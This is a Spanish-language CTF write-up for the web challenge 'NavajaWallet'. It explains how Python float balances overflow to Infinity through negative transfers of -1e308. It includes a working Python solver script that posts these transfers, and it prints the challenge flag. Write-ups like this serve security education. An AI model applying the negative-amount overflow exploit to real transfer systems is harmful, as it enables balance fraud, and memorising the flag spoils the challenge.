# NavajaWallet

> Navaja Negra CTF 2025

> 02/10/2025 09:00 CEST - 04/10/2025 11:00 CEST

* Categoría: Web
* Autor: eljoselillo7
* Dificultad: ★☆
* Etiquetas: Python infinity

## Descripción

    ¡La Wallet más loca de NavajaCoins ha llegado! 💸
    Guarda y transfiere tus monedas… y trata de no perder todo en el camino.

    ¿Tienes lo que hace falta para ser un maestro de la NavajaWallet? 🚀

## Archivos

    NavajaWallet.zip

## Resolución

La aplicación simula una cartera de criptomonedas de Navaja Negra. El objetivo es conseguir que todas las monedas de la cartera superen el millón de unidades. El problema es que el usuario inicial solo dispone de 1000 monedas de una de ellas.

A primera vista parece imposible, pero la clave está en la forma en la que la aplicación maneja los saldos: las cantidades se almacenan en formato float de Python.

### Análisis de la vulnerabilidad

En Python, los floats tienen un límite máximo cercano a `1.79e+308`. Si se sobrepasa ese valor, el resultado se convierte en `Infinity`.  

Las operaciones con este valor tienen un comportamiento peculiar:

- `Infinity - N = Infinity`
- `Infinity + N = Infinity`

Esto permite crear un saldo infinito en una de las monedas y luego transferirlo al resto hasta superar el millón.

Sin embargo, hay que tener cuidado:
- Si una moneda llega a `-Infinity`, ya no se puede recuperar.
- Cualquier operación del tipo `Infinity + (-Infinity)` devuelve `NaN`, lo que impediría resolver el reto y habría que empezar de nuevo.

### Explotación

Para forzar el overflow hacia `Infinity`, podemos realizar transferencias extremadamente grandes en negativo desde nuestra moneda inicial hacia las demás. Por ejemplo:

`transferir -1e308 miguelitoCoins → nocheNNCoin`
`transferir -1e308 miguelitoCoins → navajaCoin`  

De esta forma, la cantidad de `miguelitoCoins` se convierte en `Infinity`, mientras que el resto siguen en un valor manejable. 

A partir de ahí, solo necesitamos sumar desde Infinity hasta que cada moneda supere el millón.

El reto puede resolverse fácilmente con un script en Python que automatice las transferencias y logre que todas las monedas lleguen al valor requerido:

```python
import sys
import requests

if len(sys.argv) != 2:
    print("Uso: python3 solver.py <URL_BASE>")
    print("Ejemplo: python3 solver.py http://example.com:5000")
    sys.exit(1)

BASE_URL = sys.argv[1].rstrip("/")  # Asegura que no termine en "/"

session = requests.Session()  # Mantiene cookies (JWT)

session.get(f"{BASE_URL}/")

transfers = [
    ("miguelitoCoin", "nocheNNCoin", "-1e308"),
    ("miguelitoCoin", "navajaCoin", "-1e308"),
    ("miguelitoCoin", "navajaCoin", "1e308"),
    ("miguelitoCoin", "navajaCoin", "1e308"),
    ("miguelitoCoin", "nocheNNCoin", "1e308"),
    ("miguelitoCoin", "nocheNNCoin", "1e308"),
]

for source, target, amount in transfers:
    resp = session.post(f"{BASE_URL}/transfer", json={
        "source": source,
        "target": target,
        "amount": amount
    })
    print(resp.text)

# Ahora intentar obtener el FLAG
flag_resp = session.get(f"{BASE_URL}/flag")
print(flag_resp.text)
```

> **flag: nnctf{gRaC1a5_p0r_tU_Inf1nit4_inversion}**